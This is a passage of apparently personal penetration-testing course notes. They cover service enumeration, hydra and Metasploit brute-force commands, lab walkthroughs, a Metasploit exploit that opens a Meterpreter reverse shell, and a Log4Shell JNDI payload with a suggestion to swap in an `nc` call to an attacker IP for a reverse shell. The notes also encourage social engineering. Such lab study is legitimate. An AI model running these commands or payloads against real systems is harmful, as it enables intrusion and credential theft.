  flag.tar.gz                         N      151  Tue Nov 27 19:25:12 2018
smb: \hidden\> get flag.tar.gz
$ tar xfv flag.tar.gz
```

And we're good to go.

<a id="5.9"></a>
## FTP service enumeration

```bash
$ nmap -sV -A -p21 [TARGET]
$ ftp [TARGET]
$ hydra -L /path/to/users -P /path/to/passwords [TARGET] [SERVICE]
$ hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords [TARGET] ftp
$ nmap --script ftp-brute --script-args userdb=/path/to/users -p21 [TARGEt]
```

<a id="5.9.1"></a>
### ProFTP Recon: Basics lab 

Objective: get the password for the auditor user and the flag!

```bash
$ ping $target
$ nmap -sV -A $target
21/tcp open  ftp     ProFTPD 1.3.5a
$ ftp $target
# We don't have a password, and the FTP server doesn't 
# let us use an anonymous account. Let's get some cr3ds!!!
$ hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt $target ftp
# WE GOT A HIT!!!
[21][ftp] host: .3   login: auditor   password: p4ssw0rd
$ ftp $target
ftp > ls
secret.txt
ftp > get secret.txt
# Lesgooooo!
```

<a id="5.10"></a>
## VSFTPD Recon: Basics

```bash
$ nmap -sV -A --script ftp-anon
```

<a id="5.10.1"></a>
### VSFTPD Recon: Basics Lab

Objective: get the flag, although we don't have a user or password...

```bash
$ nmap $target
21/tcp open  ftp
$ nmap -sV -A -p21 $target
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 ftp      ftp            33 Dec 18  2018 flag
|_drwxr-xr-x    2 ftp      ftp          4096 Dec 18  2018 pub
$ ftp $target
# We log in with the anonymous user...
ftp > ls
-rw-r--r--    1 ftp      ftp            33 Dec 18  2018 flag
ftp > get flag
# Good to go...
```

<a id="5.11"></a>
## SSH Recon: Basics

| Script            | Function                                     | Args                                      |
|------------------ | -------------------------------------------- | ----------------------------------------- |
| ssh2-enum-algos   | Enumerates accepted encryption algorithms.   | None                                      |
| ssh-hostkey       | Shows SSH keys.                              | ssh-hostkey.known-hosts-path, ssh-hostkey |
| ssh-auth-methods  | Returns authentication methods.              | ssh.user                                  |
| ssh-brute         | Bruteforce SSH                               | userdb, passdb, ssh-brute.timeout, etc    |

Note to self: look for noauth methods.

<a id="5.12"></a>
## SSH Dictionary Attacks

```bash
$ hydra -L /path/to/users -P /path/to/passwords [TARGET] ssh
$ nmap [TARGET] --script ssh-brute --script-args userdb=/path/to/users passdb=/path/to/passwords
msf > use auxiliary/scanner/ssh/ssh_login
msf auxiliary > set RHOSTS [TARGET]
msf auxiliary > set USERPASS_FILE /path/to/users
msf auxiliary > run
```

<a id="5.12.1"></a>
### SSH Dictionary Attacks: Lab

Objective: find the "student" password with Hydra, the administrator with nmap and root with msfconsole.

```bash
$ echo student > student; echo administrator > administrator; echo root > root
$ hydra -L ./student -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
# We get a hit on the password: "enemy"
$ nmap -p21 --script ssh-brute --script-args userdb=/root/administrator
# Password is "moonlight".
$ msfconsole
msf > use auxiliary/scanner/ssh/ssh_login
msf auxiliary > set RHOSTS $target
msf auxiliary > set USERPASS_FILE /usr/share/wordlists/metasploit/root_userpass.txt
msf auxiliary > run
# If a hit is given, an SSH session will be opened. It's terrible, though. 
```

<a id="5.13"></a>
## HTTP Recon

```bash
$ whatweb [TARGET]
$ dirb [TARGET]
$ gobuster dir -u [TARGET URL] -w /path/to/dirs
$ browsh --startup-url [TARGET URL] # For rendering websites in the terminal
```

<a id="5.14"></a>
## HTTP IIS: Nmap scripts

| Script                          | Function                                           | Args                       |
|-------------------------------- | -------------------------------------------------- | -------------------------- |
| http-enum                       | Enumerates directories used by web applications.   | Check the docs.            |
| http-headers                    | Performs a HEAD request.                           | path=[bool], useget=[dir]      |
| http-methods                    | Checks what methods are allowed.                   | [.]url-path=[dir]              |
| http-webdav-scan                | A script to detect WEBDAV installs.                | [.]path                      |

Don't forget that IIS sucks cock and balls. Use Apache instead!

<a id="5.15"></a>
## HTTP Apache

| Script | Function         |
| ------ | ---------------- |
| banner | Grab the banner! |
| 

```bash
msf5 > use auxiliary/scanner/http/http_version
msf5 auxiliary > set RHOSTS [TARGET]
msf5 auxiliary > set RPORT [TARGET PORT]
msf5 > use auxiliary/scanner/http/brute_dirs
msf5 auxiliary > set RHOSTS [TARGET]
msf5 auxiliary > set RPORT [TARGET PORT]
msf5 > use auxiliary/scanner/http/robots_txt
msf5 auxiliary > set RHOSTS [TARGET]
msf5 auxiliary > set RPORT [TARGET PORT]
$ curl [TARGET] | more # The more is not needed. It's used for readability, nothing else.
# You can also redirect the output or append it (> or >>)
$ wget [TARGET]
$ lynx [TARGET URL]
```

<a id="5.15.1"></a>
### Apache HTTP Lab

Objective: find robots.txt: what bot is blocked from indexing the webpage?

```bash
$ nmap -sV --script http-enum,banner $target 
80/tcp open  http
| http-enum: 
|   /robots.txt: Robots file
|   /data/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'
|   /dir/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'
|_  /src/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'
$ curl $target/robots.txt
# Jackpot!
```

<a id="5.16"></a>
## MySQL Recon

```bash
$ 
$ mysql -h [TARGET] -u [USER]
  > select load_file("/path/to/file")
  > show databases;
  > use [DATABASE]
    > select count(*) from [TABLE];
    > select * from [TABLE];
msf5 > use auxiliary/scanner/mysql/mysql_writable_dirs
msf5 auxiliary > set verbose false
msf5 auxiliary > setg RHOSTS [TARGET] # Setg = set global variable.
msf5 auxiliary > set username [USERNAME]
msf5 auxiliary > set password [PASSWORD]
msf5 > use auxiliary/scanner/mysql/mysql_hashdump
msf5 auxiliary > set RHOSTS [TARGET] # use if setg was not used
msf5 auxiliary > set username [USERNAME]
msf5 auxiliary > set password [PASSWORD]
$ nmap --script mysql-empty-password -p3306 $target 
$ nmap --script mysql-info -p3306 $target
$ nmap --script mysql-users --script-args="mysqluser='[USER]',mysqlpass='[PASSWORD]'"
$ nmap --script mysql-databases --script-args="mysqluser='[USER]',mysqlpass='[PASSWORD]'"
$ nmap --script mysql-variables --script-args="mysqluser='[USER]',mysqlpass='[PASSWORD]'"
$ nmap --script mysql-dump-hashes --script-args="username='[USER]',password='[PASSWORD]'"
$ nmap --script mysql-query --script-args="username='[USER]',password='[PASSWORD]',query='select count(*) from [DATABASE].[TABLE]'"
$ nmap --script mysql-audit --script-args="mysql-audit.username='[USER]',mysql-audit.password='[PASSWORD]',mysql-audit.filename='/usr/share/nmap/nselib/data/mysql-cis.audit'
```

<a id="5.17"></a>
## MySQL Dictionary Attacks

```bash
msf5 > use auxiliary/scanner/mysql/mysql_login
msf5 auxiliary > set RHOSTS [TARGET]
msf5 auxiliary > set PASS_FILE /path/to/passfiles
msf5 auxiliary > set USERNAME [USERNAME]
$ hydra -L {/path/to/usr|[USERNAME]} -P /path/to/passwords [TARGET] mysql
```

<a id="5.18"></a>
## MSSQL Nmap Scripts

| Script                 | Function                                                          | Args                             |
|----------------------- | ----------------------------------------------------------------- | -------------------------------- |
| ms-sql-info            | Get information about the MSSQL server.                           |                                  |
| ms-sql-ntlm-info       | Get information about the MSSQL server interaction with NTLM.     | mssql.instance                   |
| ms-sql-brute           | Bruteforce the login credentials.                                 | userdb, passdb, mssql.instance   |
| ms-sql-empty-passwords | Searches for accounts without passwords.                          |                                  |
| ms-sql-query           | Send a query. Recommended to use -oN                              | .username, .password, .query     | 
| ms-sql-dump-hashes     | Dump account password hashes.                                     | .username, .password             |
| ms-sql-xp-cmdshell     | Attempt to execute commands.                                      | username, password, .cmd       |

Interesting queries:

- SELECT * FROM master..syslogins 

<a id="5.19"></a>
## MSSQL Metasploit.

```bash
msf5 > use auxiliary/scanner/mssql/mssql_login
msf5 auxiliary > set RHOSTS [TARGET]
msf5 auxiliary > set USER_FILE /path/to/users
msf5 auxiliary > set PASS_FILE /path/to/passwords
msf5 > use auxiliary/admin/mssql/mssql_enum
msf5 auxiliary > set RHOSTS [TARGET]
msf5 > use auxiliary/admin/mssql/mssql_enum_sql_logins
msf5 auxiliary > set RHOSTS [TARGET]
msf5 > use auxiliary/admin/mssql/mssql_exec
msf5 auxiliary > set CMD [CMD]
msf5 > use auxiliary/admin/mssql/mssql_enum_domain_accounts
```
<a id="6"></a>
# Recon: Vulnerability Assessment. 

<a id="6.1"></a>
## Vulnerabilities.

A vulnerability is a weakness in the computational logic found in software and hardware
that, when exploited, results in negative impact to confidentiality, integrity and/or availability (CIA triad).

Vulnerabilities may come from operating systems, software or hardware.  

A CVE is an acronym for "Common Vulnerabilities and Exposures". A list of references for CVE's are as follows:

- MITRE 
- CVE-Details
- NIST-NVD

CVE's have identifiers or names. Some of them are:

- CVE-2021-44228 (Log4J)
- CVE-2014-0160 (Heartbleed)
- CVE-2017-0143 (EternalBlue)

<a id="6.1.1"></a>
### Understanding vulnerability detail pages.

They contain descriptions, severity, references, weakness enumeration, known affected software configuration  

The weakness enumeration helps categorize the weaknesses, vulnerability type, security issues associated with
the vulnerability and possible prevention efforts to address detected security vulnerabilities.

CPE is a structured naming scheme for information technology systems, software, and packages. Based upon the 
generic syntax for Uniform Resource Identifiers (URI), CPE includes a formal name format, a method for checking 
names against a system, and a description format for binding text and tests to a name.

KEV or Known Exploited vulnerability is a section that only appears after the CVE has been added to CISA's Known 
Exploited VUlnerabilities Catalog. 

KASC or Known Affected Software Configuration is used to show what software or combination of software is considered
to be vulnerable at the time of analysis. 

Impact is very important. Our customers mostly care about this. That is because the impact is measured on how a vulnerability
affects the confidentiality of information, the integrity of it and the availability.

Helpful resource: https://nvd.nist.gov/vuln/vulnerability-detail-pages

<a id="6.2"></a>
## 0days.

Some exploits use vulnerabilities that have not been reported nor found. That's why it's called 0day: because it's zero days
of knowing the vulnerability exists.

<a id="6.2.1"></a>
### The human side of vulnerabilities.

Social engineering and interpersonal skills are as useful as knowing how to type code. If you convince some dude to let you
into a data center with his credentials (because you don't have yours yet, but your job is very critical to do, right?) AND an 
unlocked terminal, you've already hacked the place. You pwned it.

Tailgating, RFID cloning, shoulder surfing and more are common social engineering techniques used in the wild.

<a id="6.3"></a>
## Case Studies

<a id="6.3.1"></a>
### Heartbleed

It was a vulnerability found on the Heartbeat plugin of OpenSSL. Mishandles TLS packets and allows for remote attackers
to obtain access to the PKI infrastructure (Public Key infrastructure) and to private keys, which are the ones that encrypt 
the data. 

We can use Nmap to find potentially vulnerable OpenSSL implementations.

```bash
$ nmap -p443 --script ssl-enum-ciphers [TARGET]
# Check the ciphers. Look at the TLS versions. Is version 1 enabled?
$ nmap -p443 --script ssl-heartbleed [TARGET]
# Checks for that vulnerability.
```

The anatomy of the attack is as follows:

1. The attacker first sends a packet to the SSL service with a correct password and a correct length.
2. The service responds OK and returns the password.
3. The attacker now sends a new packet, but the password length does not match the actual length. 
4. The service accepts the password and returns the password plus the following sections of memory.
5. The attacker can ask for at most 64.000 characters of information.

<a id="6.3.2"></a>
### EternalBlue (MS17-010)

EternalBlue is a vulnerability that affects SMBv1 from Windows Vista up to Windows Server 2016.
Technically, it should also affect any unpatched version of the SMBv1 protoocl.

The vulnerability exploit three different bugs:
- Wrong casting bug: A bug in the process of converting FEA (File Extended Attributes) from Os2 
structure to NT structure by the Windows SMB implementation (srv.sys driver) leads to buffer overflow 
in the non-paged kernel pool.

- Too complex to explain in few words. Check the paper linked below.

- There is a bug that lets you allocate a chunk with a specified size in the kernel non-paged pool with 
the specified size. It is used in the heap grooming phase when creating a hole that later will be filled 
with a data size that causes an out of bound write to the next chunk (Bug A & Bug B).

[Source: Checkpoint](https://research.checkpoint.com/2017/eternalblue-everything-know/). Very in-depth research on the matter. Good for those who want to learn 
and understand.

EternalBlue is famous due to it's usage on the ransomware WannaCry released around 2017. 

We can search for this vulnerability using NSE scripts.

```bash
$ nmap --script vuln-ms17-010 [TARGET] # MS17-010 it's the internal vulnerability numbering system Microsoft uses.
```

The anatomy of the attack goes like this:

1. Send a specially crafted malicious payload to the SMB server.
2. Depending on the payload, you might get a reverse shell or something else.

<a id="6.3.3"></a>
### Log4shell (Log4J)

Log4J is a common library that's used for logins in Java. It exploits a mishandling of JNDI and LDAP queries.

Install the NSE script from GitHub.

```bash
$ mkdir -p $HOME/.nmap/scripts
$ git clone https://github.com/giterlizzi/nmap-log4shell && cp nmap-log4shell/log4shell.nse $HOME/.nmap/scripts && rm -rf nmap-log4shell
$ nc -nlvp [PORT]
$ nmap --script log4shell --script-args log4shell.callback-server=[ATTACKER IP]:[ATTACKER PORT] [TARGET]
```

The anatomy of the attack goes like this:

1. The attacker sends a malicious payload 
  - Similar to this: ${jndi:ldap://our_ldap_server/my_code}.
2. It mishandles the request and it evaluates the code.
3. Since the payload is between curly braces and it starts with a dollar sign, it thinks it's a 
variable. So, it connects to the LDAP server to find the "my_code" code.
4. It then executes the class "my_code". It can be whatever the attacker wants (as long as its inside
the servers permission to run).

An instance of "my_code" can be like [this](https://github.com/snyk-labs/java-goof/blob/main/log4shell-goof/log4shell-server/src/main/java/Evil.java). 
This code is benign. It doesn't establish anything serious like a reverse shell or an SQL dump. It just
creates a file with the content "PWNED". nevertheless, it can be malicious. Change the "echo" with something 
like a `nc [ATTACKERS IP] [ATTACKERS PORT]` and you'll have a reverse shell. Although in most cases, a Python
one-lines will work better than a Netcat session, since people have realized that having Netcat is a good thing 
for LOTL experts.

<a id=6.4></a>
## Nessus

*By some reason, the Nessus section of the course is after this entire chapter. I know how to use Nessus, so it's not a problem for me. nevertheless, if you don't know how to use Nessus, wait for the next chapter. I'll update this file whenever I've started the auditing course.* 

<a id=6.5></a>
## Vulnerability Assessment

Do a Nmap scan. Check the services versions, google them, find something like an exploit on Exploit-db and become a skiddie. 
Just kidding. Read the exploits, don't just use them. Improve upon them. Be better.

For later: I'd like to write a script based upon the [VSFTPD smiley face vulnerability](https://github.com/penkit/site/blob/master/guides/vsftpd-backdoor.md)
because, since I don't have a lot of expertise writing exploits or more "complex" scripts, I think a vulnerability 
of this ~~easiness to exploit~~  simplicity would be a good place to start.

<a id=6.5.1></a>
### Windows: Easy File Sharing Server Lab

Objective: exploit the server and retrieve the flag.

```bash
$ nmap -sV $target
80/tcp    open  http           BadBlue httpd 2.7
# BadBlue is an old file sharing program. It's out of development and vulnerable to a lot of attacks. Let's try to exploit it.
$ msfconsole
msf5 > use use exploit/windows/http/badblue_passthru
msf5 exploit > options
Module options (exploit/windows/http/badblue_passthru):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT    80               yes       The target port (TCP)
   SSL      false            no        Negotiate SSL/TLS for outgoing connections
   VHOST                     no        HTTP server virtual host
msf5 exploit > set RHOST $target
msf5 exploit > set RPORT 80
msf5 exploit > use payload windows/meterpreter/reverse_tcp
msf5 exploit > exploit

[*] Started reverse TCP handler on 10.10.80.5:4444 
[*] Trying target BadBlue EE 2.7 Universal...
[*] Sending stage (180291 bytes) to 10.4.20.250
[*] Meterpreter session 2 opened (10.10.80.5:4444 -> 10.4.20.250:49257) at 2023-08-07 20:56:44 +0530

meterpreter > shell
Process 500 created.
Channel 1 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Program Files (x86)\BadBlue\EE>echo pwned!!!
echo pwned!!!
pwned!!!
C:\Program Files (x86)\BadBlue\EE>cd C:\
C:\>dir
09/16/2020  09:01 AM                32 flag.txt
C.\>type flag.txt
```

We're good to go!
